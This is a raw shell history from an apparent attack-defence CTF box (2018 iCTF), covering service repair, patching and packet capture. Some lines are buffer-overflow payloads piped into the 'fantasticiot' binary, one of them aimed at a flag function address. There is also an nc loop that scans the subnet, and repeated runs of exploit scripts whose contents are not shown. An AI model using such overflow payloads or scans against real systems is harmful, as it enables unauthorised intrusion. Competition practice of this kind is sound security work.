sudo -i
netstat  -ln 
sudo su 
ll  /opt/ctf/babymarvel/ro
cd  /opt/ctf/babymarvel/ro
ls -lrt 
cat wrapper.sh 
cat /proc/cpuinfo 
Our psychic sources tell us that babymarvel is currently at /opt/ctf/babymarvel/ro/whoami. You should put babymarvel back in its place by cp /opt/ctf/babymarvel/ro/whoami /opt/ctf/babymarvel/ro/babymarvel.
But check the scoreboard after a few ticks to make sure babymarvel is running!
Be sure to check babymarvel’s permissions ls -la /opt/ctf/babymarvel/ro/babymarvel, to make sure the ctf_babymarvel user can execute it!
Put the baby back in the crib correctly with chown ctf:ctf_babymarvel /opt/ctf/babymarvel/ro/babymarvel.
At this point babymarvel should be found and you should see green lights on the scoreboard after the next few ticks!
What is that you’re saying, your poor babymarvel is getting pwned? Well this is a CTF, what did you expect?
#/etc/xinetd.d/babymarvel
cat /etc/xinetd.d/babymarvel
cat /opt/ctf/babymarvel/ro/wrapper.sh 
../ro/babymarvel
ll
.. src/
cd src/
ll
cat Makefile 
pwd
pushd ~/
ll
pwd
ll
mkdir babymarv_orig
cp -a /opt/ctf/babymarvel/ .
cp -a /opt/ctf/babymarvel/ babymarv_orig/
cd
cd /opt/ctf/
ll
cd babymarvel/
ll
ll append/
cd rw/
ll
cd ../r
cd ..
cd ro/
ll
hostname 
hostname -a 
file whoami 
strace ./whoami 
ls -lrt 
ll ,,
ls -lrt 
ls -lrt src/
file x0
ll
cat wrapper.sh 
cd /opt/ctf/babymarvel/rw/
file ../ro/babymarvel
ls -l 
ls -l  ../
ls -l  ../ro/
cd ..
ll
cd ro/
pwd
ls
vi lobby.c 
ls
vi users.c 
ls
vi utils.c 
ls
vi lobby.h 
vi Makefile 
ls
vi lobby.c 
make
vi lobby.c 
make
exit
exit
ping 172.31.172.255
pwd
ll
cd babymarv_orig/
ll
cd babymarvel/
ll
cd ro/
ll
cd src/
ll
cat lobby.c 
cd ..
ll
cd ..
ll
cp -a babymarvel/ro/src/ .
cd src/
ll
cat Makefile 
make 
ls -lrt 
cat /opt/ctf/babymarvel/ro/wrapper.sh 
./babymarvel 
ll
vim program.c 
vim lobby.c 
pwd
ls -lrt 
date
ps ax
pwd
make
./babymarvel 
pwd
ls -lrt 
cp /opt/ctf/babymarvel/ro/whoami /opt/ctf/babymarvel/ro/babymarvel
/opt/ctf/babymarvel/ro/babymarvel
ls -lrt 
vi lobby.c 
ll /opt/ctf/babymarvel/ro/babymarve
ll /opt/ctf/babymarvel/ro/babymarvel 
chown ctf.ctf_babymarvel /opt/ctf/babymarvel/ro/babymarvel
ll /opt/ctf/babymarvel/ro/babymarvel 
ll /opt/ctf/babymarvel/ro
/opt/ctf/babymarvel/ro/wrapper.sh 
cp babymarvel /opt/ctf/babymarvel/ro/babymarvel
service xinetd restart
sudo service xinetd restart
su 
ps ax | grep xinet
cat /opt/ctf/babymarvel/ro/wrapper.sh 
netstat -ln 
ps ax 
cp cp /opt/ctf/babymarvel/ro/whoami /opt/ctf/babymarvel/ro/babymarvel .
cp /opt/ctf/babymarvel/ro/whoami /opt/ctf/babymarvel/ro/babymarvel .
cp -r /opt/ctf/babymarvel/ro/whoami /opt/ctf/babymarvel/ro/ .
ls
cd babymarvel
ls
cd ro
ls
cd src/
vi lobby.c 
screen -X
screen 
sudo xinetd 
cat /etc/services 
xinetd 
ps ax | grep xinet
ps ax
cat /etc/xinetd.d/babymarvel
/etc/xinetd.d/babymarvel
ll /etc/xinetd.d/babymarvel
pip install swpag_client
pwd
cd 
cd
ll
cd babymarv_orig/
ll
cd src/
ll ../babymarvel/
ll ../babymarvel/ro/src/
pwd
ps ax
ll ../babymarvel/ro/src/
pwd
ll
pwd
cd ..
ll
ll babymarvel/ro/src/
cat /opt/ctf/babymarvel/
cat /opt/ctf/babymarvel/ro/wrapper.sh 
cat /etc/xinetd.d/babymarvel 
pwd
ll
cd ..
ll
cd babymarv
cd babymarv_orig/
ll
cd babymarvel/
cd sr
pwd
c
cd
cd babymarv
ll
cd babymarvel
ll
cd ro/
ll
cd src/
ll
ls -lrt 
./babymarvel 
ls -lrt 
diff lobby.c  ~/babymarv_orig/src/lobby.c 
diff -u  lobby.c  ~/babymarv_orig/src/lobby.c 
#diff -u  lobby.c  ~/babymarv_orig/src/lobby.c 
cd
cd babymarv_orig/src/
ll
cp lobby.c lobby.c.orig 
cp /opt/ctf/babymarvel/ro/src/lobby.c  lobby.c
make
cp babymarvel  /opt/ctf/babymarvel/ro/babymarvel 
ps ax 
/etc/xinetd.d/
ll /etc/xinetd.d/
ll /etc/xinetd.d/babymarvel 
/etc/xinetd.d/babymarvel 
/opt/ctf/babymarvel/ro/babymarvel 
netstat -ln
ll
file whoami 
ll ro/
cd babymarv_orig/
l
ll src/
ll
#rm -rf babymarvel/
ll
rm -rf babymarvel/
ll
cd
ll
ll ro/
ls -lrt
ll
cd babymarv_orig/src/
ll
vim lobby.
vim lobby..
vim lobby.c
ps ax
nohup /opt/ctf/babymarvel/ro/babymarvel & 
cat nohup.out 
/opt/ctf/babymarvel/ro/babymarvel
cat /etc/xinetd.d/
cat /etc/xinetd.d/babymarvel 
/opt/ctf/babymarvel/ro/wrapper.sh
ifconfig 
ping 172.31.129.1
#vi ping-all.sh 
cd babymarv_orig/
cd src/
ll
vim program.c 
#vim pastes.c 
ll
ll ~/
l
ll
nc -h
nc -h localhost:20001
nc  localhost 20001
cd babymarv_orig/
ll
cd src/
ll
cp program.c program2.c 
vi program2.c 
cat program2.c 
vi  Makefile
#make babymarvel2 
ll
vi  Makefile
make babymarvel2 
vi  babymarvel2 
vi program.c 
make babymarvel
vim Makefile 
make
vi program.c 
ls -lrt
male
make
vi Makefile 
make
cp Makefile Makefile.bak 
vi Makefile
make
cp babymarvel /opt/ctf/babymarvel/ro/babymarvel 
ps ax
cp babymarvel /opt/ctf/babymarvel/ro/babymarvel 
vim Makefile.bak 
make -f Makefile.bak 
make -f Makefile.bak babymarvel2
cp Makefile.bak  Makefile
make
vim Makefile
ll
make 
vim Makefile
make clean 
make
vim Makefile
make
ll
ls -rlt
cp program.c program-printhex.c 
vim Makefile
ll
vim Makefile
vim program-printhex.c 
vim program2.c 
make babymarvel-hex
ll
cat Makefile
make babymarvel-hex
vim Makefile
ls -lrt 
cat Makefile
make babymarvel-hex
gcc program-printhex.c  utils.c lobby.c users.c pastes.c -std=c99 -O1 -Wno-unused-result -Wno-format-security -o babymarvel-hex
ls -lrt 
pwd
#ll /home/ctf/babymarv_orig/src/babymarvel-hex
grep 20001 * 
ll
cat program2.c 
cat /etc/passwd
su ctf_babymarvel
cat /etc/motd 
cd /opt/ctf/
ls
cd babymarvel/
ls
cd append/
ls
cd ..
cd ro/
ls
cat wrapper.sh 
./wrapper.sh 
ps aux | grep wrapper
ls
cd src/
ls
cd ..
ls
cd ..
cd rw/
ls
cd ..
ls
cat /etc/xinetd.d/babymarvel 
ls
cd ro/
ls
whoami 
vi whoami 
ls
cd src/
ls
file x00
ls -al 
ps aux
vi program.c 
telnet
nc localhost 20001
nmap localhost
ifconfig 
gcc
arp -a -n
ifconfig 
ping 172.31.129.255
tmux 
cd
ls
w
vi .tmux.conf
tmux 
exit
ls -lrt 
ls -rlt 
cat ./hack_the_planet.py 
ps ax
cd babymarv_orig/src/
lr
ls -lrt 
./babymarvel2 1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
cat program2.c 
cd 
ll
mkdir goapsych0 
cd goapsych0/
cp ../hack_the_planet.py ./
ll
cp -a ../babymarv_orig/src/ babemarv
cd babemarv/
pwd
ll
vim program2.c 
make
./babymarvel2  1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
pwd
./babymarvel2  1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
vim program2.c 
cat Makefile
make babymarvel2
./babymarvel2  1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
vim program2.c 
make babymarvel2
./babymarvel2  1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
vim program2.c 
make babymarvel2
vim program2.c 
make babymarvel2
./babymarvel2  1df91cd100ff86baf7a77457cbfb7c6bf276c54ec890b1ef5f00ae5a6ad7ffd2
ll
vim utils.c
pwd
ls -lrta 
pwd
ll
cat 1
:q
ll
pwd
history 
history | less
ls
cd
ls
cat hack_the_planet.py 
python hack_the_planet.py 
/home/ctf/babymarv_orig/src/babymarvel-hex
ls
cd pastes/
ls
cd bla/
ls
cat bla 
cat password 
ls
cd ..
ls
cd hugo/
ls
cat 946c79a541e2ab2ddb3fd581b8622303 
cat c 
ls
cd ..
ls
cd ..
ls
/home/ctf/babymarv_orig/src/babymarvel-hex
pwd
cat ../../etc/passwd
/home/ctf/babymarv_orig/src/babymarvel-hex
ls
cd /opt/ctf/
ls
cd babymarvel/
ls
cd r
cd rw/
ls
cd pastes/
ls -al
su ctf_babymarvel
ls
cd ..
ls
cd ro/
ls
diff babymarvel whoami 
cd src/
ls
vi program.c 
/home/ctf/babymarv_orig/src/babymarvel-hex
vi program.c 
vi lobby.c 
cd /opt/ctf/fantasticiot/
ls
ls -al
cd append/
ls
cd ..
ls
cd ro/
ls
cat wrapper.sh 
ls
file fantasticiot 
strings fantasticiot 
strings fantasticiot | less
ls
./fantasticiot 
./fantasticiot $(python -c 'print "A"*140 + "\x07\xd9\xff\xff"')
$(python -c 'print "A"*140 + "\x07\xd9\xff\xff"') | ./fantasticiot 
python -c 'print "A"*140 + "\x07\xd9\xff\xff"'
python -c 'print "A"*140 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*1400 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*14000000000 + "\x07\xd9\xff\xff"' | ./fantasticiot 
x
python -c 'print "A"*1400000 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*140000 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*14000 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*1400 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*5000 + "\x07\xd9\xff\xff"' | ./fantasticiot 
python -c 'print "A"*5000' | ./fantasticiot 
python -c 'print "A"*5030' | ./fantasticiot 
python -c 'print "A"*2030' | ./fantasticiot 
python -c 'print "A"*3030' | ./fantasticiot 
python -c 'print "A"*2500' | ./fantasticiot 
python -c 'print "A"*2200' | ./fantasticiot 
python -c 'print "A"*2100' | ./fantasticiot 
python -c 'print "A"*2000' | ./fantasticiot 
python -c 'print "A"*2010' | ./fantasticiot 
python -c 'print "A"*2020' | ./fantasticiot 
python -c 'print "A"*2030' | ./fantasticiot 
python -c 'print "A"*2040' | ./fantasticiot 
python -c 'print "A"*2050' | ./fantasticiot 
python -c 'print "A"*2049' | ./fantasticiot 
python -c 'print "A"*2048' | ./fantasticiot 
python -c 'print "A"*2049' | ./fantasticiot 
ls
./fantasticiot 
strings fantasticiot 
strings fantasticiot | less
./fantasticiot 
cd ..
cd rw/
ls
ls -al
cat you_can_prepopulate_your_rw_dir 
date
cd flag/
ls
cd ..
ls
cd fridge/
ls
ls -al
cd ..
ls
cd ..
ls
cd ro/
ls
cat wrapper.sh 
strace ./fantasticiot 
ls -strahl ../rw/flag/
date
strace ./fantasticiot 
ls -strahl ../rw/flag/
ls -strahl ../rw/fridge/
ls
gdb ./fantasticiot 
objdump -d ./fantasticiot 
objdump -d ./fantasticiot | less
gdb ./fantasticiot 
ls
./fantasticiot 
nm ./fantasticiot 
nm ./fantasticiot | less
nm ./fantasticiot | grep flag | grep get
python -c 'print "A"*2048 + "\x55\x96\x04\x08"' | ./fantasticiot 
w
who
date
tmux
w
ps ax
ls -lrt
cat list.txt 
cd babymarv_orig/
cd src/
ls -lrt
cat program2.c 
pip install pwn
cd goapsych0/
cd babemarv/
ll
make
cat Makefile
ll
./babymarvel-hex 
./babymarvel2  3225755ee35c56d1595de94680024c279f60ca9eefa1b22e5b6dcd8748c1cc5a
make
cat utils.c
ls
cd babymarvel/
ls
tmux
cd /opt/ctf/
cd venom/
ll
ls =-lrt
ll rw
cd ro
ls -lrt
file venom 
less venom 
pwd
cd ..
pwd
cd babymarv_orig/
ll
cd src/
ll
./babymarvel-hex 
ll ../
ll ../../
cd babymarv_orig/src/
vim utils.c
tcpdump port not 22 
tcpdump -vv  port not 22  | tee tcpdump-01
tcpdump -vv  port not 22  
tcpdump -vv  port not 22  | tee tcpdump-02
# tcpdump -w - | tee somefile | tcpdump -r -
tcpdump -vv -w - port not 22  | tee tcpdump-03 | tcpdump -r 
lr
ls -lr
ls -lrt
tcpdump -vv -w - port not 22  | tee tcpdump-03 
tcpdump  =r 

tcpdump  -r
tcpdump  -r -
ls
cd venom
ls
cd ro
l
less wrapper.sh 
less venom 
ls
less venom 
ls
less listener 
less chromedriver 
less listener 
less chromedriver 
r
ls
less wrapper.sh 
ls
less venom 
./venom 
2
ls
ps x
ls
cat /etc/xinetd.d/venom 
ls
less venom 
ls
less venom 
ls
..
cd ..
ls
cd rw
ls
less plan
cd ..
ls
cd rw
ls
cd ..
ls
cd rw
ls
cd ..
ls
cd ro
ls
ifconfig 
ifconfig  -a
exit
s
ps x
kill -9 5173
tmux
lynx
apt-get install lynx
sudo apt-get install lynx
sudo root
ls -lrt
cd ..
ls -lrt
ll ubuntu/
ls -lrt
cd
ls -lrt
mkdir tcpdumps
ps ax | grep tcpdump
tcpdump -h
ifconfig 
man tcpdump 
tcpdump  tcp port 20004
nohup tcpdump -v  tcp port 20004 &
cat nohup.out 
tail -f nohup.out 
ln -s nohup.out  tcpdump-port-20004 nohup.out 
ll
ll tcpdumps/
cat nohup.out 
tail -f nohup.out 
for((i=1; i<254; i++)) ; do nc -w 1 172.31.129.$i 20001 && echo "172.31.129.$i"; echo "------"; done
nc 172.31.129.9 20001
pip install pwntools
ls
vi pwn.py
python pwn.py 
vi pwn.py
python pwn.py
cd
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
vi popel.py
python popel.py 
nc 127.0.0.1 20001
python popel.py 
vi popel.py
python popel.py 
vi popel.py
ifconfig 
cd /ctf
cd /opt/ctf/
ls
cd venom/
ls
cd ro/
ls
cat wrapper.sh 
ls
file venom
vi venom 
pip install --user --upgrade pwntools
cat wrapper.sh cd
cd
ls
cat popel.py 
ls
vi pwn.py
python pwn.py 
ls
rm pwn.pyc 
rm popel.py 
ls
python pwn.py 
ls
rm pwn.pyc 
ls
python -c 'from pwn import *; info("Hello")'
ls
rm pwn.py*
python -c 'from pwn import *; info("Hello")'
ls
mkdir ficken
cd f
cd ficken/
ls
vi ficken.py
python ficken.py 
vi ficken.py 
python ficken.py 
ls
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
ls
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
nc 127.0.0.1 20001
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
python ficken.py 
vi ficken.py 
cp ficken2.py
cp ficken.py ficken2.py
ls
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
history 
history | less
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
vi ficken2.py 
python ficken2.py 
/home/ctf/babymarv_orig/src/babymarvel-hex
vi ficken2.py 
/home/ctf/babymarv_orig/src/babymarvel-hex
vi ficken2.py 
/home/ctf/babymarv_orig/src/babymarvel-hex
vi ficken2.py 
/home/ctf/babymarv_orig/src/babymarvel-hex
vi ficken2.py 
cd ..
ls
tar -cf 2018ictf.tar .
tar -cf /tmp/2018ictf.tar .
ls
rm 2018ictf.tar 
tar -cf /tmp/2018ictf.tar .
mc
cd /tmp/
ls
tar -xvf 2018ictf.tar 
ls
ls -al
cd
ls -al
tar -cf /tmp/2018ictf.tar --owner=0 --group=0  .
cd /tmp/
ls
tar -cf /tmp/2018ictf.tar --owner=0 --group=0  .
tar -xvf 2018ictf.tar 
tar -xvf 2018ictf.tar --no-same-permissions
cd
mkdir trash
cd trash/
tar -xvf /tmp/2018ictf.tar 
ls -al
